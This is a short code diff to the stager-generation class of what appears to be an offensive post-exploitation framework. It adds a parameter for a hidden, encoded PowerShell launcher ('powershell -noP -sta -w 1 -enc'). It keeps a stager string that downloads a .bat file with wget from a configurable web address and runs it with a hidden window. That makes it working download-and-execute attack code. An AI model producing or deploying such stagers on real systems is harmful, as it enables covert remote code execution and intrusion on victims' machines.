@@ -75,11 +75,11 @@ class Stagers:
                 if stagerOption == option:
                     stager.options[option]['Value'] = str(value)
 
-    def generate_launcher_fetcher(self, language=None, encode=True, webFile='http://127.0.0.1/launcher.bat'):
+    def generate_launcher_fetcher(self, language=None, encode=True, webFile='http://127.0.0.1/launcher.bat', launcher='powershell -noP -sta -w 1 -enc '):
         #TODO add handle for other than powershell language
         stager = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
         if encode:
-            return helpers.powershell_launcher(stager, "")
+            return helpers.powershell_launcher(stager, launcher)
         else:
             return stager
 
